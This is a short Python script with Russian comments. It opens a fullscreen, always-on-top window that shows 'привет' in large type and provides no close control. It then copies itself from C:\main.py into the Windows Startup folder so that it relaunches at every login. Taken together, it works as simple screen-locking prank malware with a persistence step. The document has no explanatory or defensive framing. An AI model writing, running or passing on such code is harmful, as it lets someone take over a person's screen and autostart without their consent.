import os
import tkinter as tk
import shutil

# Создаем окно
root = tk.Tk()
root.attributes('-topmost', True)
root.attributes('-fullscreen', True)

label = tk.Label(root, text="привет", font=("Helvetica", 100))
label.pack(expand=True)

root.lift()

# Добавляем программу в автозапуск
src = 'C:\\main.py'
appdata = os.getenv('APPDATA')
dst = os.path.join(appdata, 'Microsoft', 'Windows', 'Start Menu', 'Programs', 'Startup', 'main.py')
shutil.copyfile(src, dst)

root.mainloop()